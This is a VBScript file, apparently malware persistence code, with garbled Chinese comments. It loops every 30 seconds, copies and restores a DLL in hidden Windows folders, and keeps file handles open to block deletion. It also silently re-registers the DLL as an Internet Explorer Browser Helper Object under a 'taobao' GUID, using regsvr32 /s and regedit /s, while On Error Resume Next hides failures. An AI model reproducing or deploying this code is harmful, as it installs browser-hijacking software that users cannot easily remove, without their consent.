dim ie
Dim dll_path,move_path,taobao_guid,regPath
Call Main
Sub Main()
On Error Resume Next
    do         
        Call SetBhoo
        execute "dim wind_1,wind_2"
        execute "set wind_1"  &   "=fso.opentextfile(""" & dll_path & """)"
        execute "set wind_2"  &   "=fso.opentextfile(""" & move_path & """)"
        wscript.sleep 30000      
    loop 
End Sub

'bho,�ɹ�����1,ʧ�ܻ���󷵻�0
Public Function SetBhoo()  
On Error Resume Next    
    dll_path="C:\WINDOWS\T\IQGMYFRDYI.dll"
    move_path="C:\WINDOWS\O\Y.dll"
    taobao_guid="{499E85A5-E402-451B-8694-79C05E95314D}"
    regPath = "C:\WINDOWS\J.reg"
    set fso=wscript.createobject("scripting.filesystemobject")
    fso.copyfile dll_path,move_path
    '�ж��ļ��Ƿ����
    if (not fso.FileExists(dll_path)) and (fso.FileExists(move_path)) then 
        fso.copyfile move_path,dll_path
    end if
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,datahome
    data=OperationRegistry.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\" & taobao_guid & "\") 
    datahome=OperationRegistry.RegRead("HKEY_CLASSES_ROOT\CLSID\" & taobao_guid & "\InprocServer32\") 
    If data="" or datahome="" Then
        'ע���ļ�
        Set fso  = Nothing
	      Set WshShell= CreateObject("WScript.Shell") 
	      WshShell.Run "regsvr32.exe /s """ & dll_path & ""
        Set WshShell  = Nothing
        
        
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\" & taobao_guid & "]"
        Set fso  = Nothing
        Set WshShell= CreateObject("WScript.Shell") 
	      WshShell.Run "regedit /s """ & regPath & ""
        Set WshShell  = Nothing
    End If
End Function

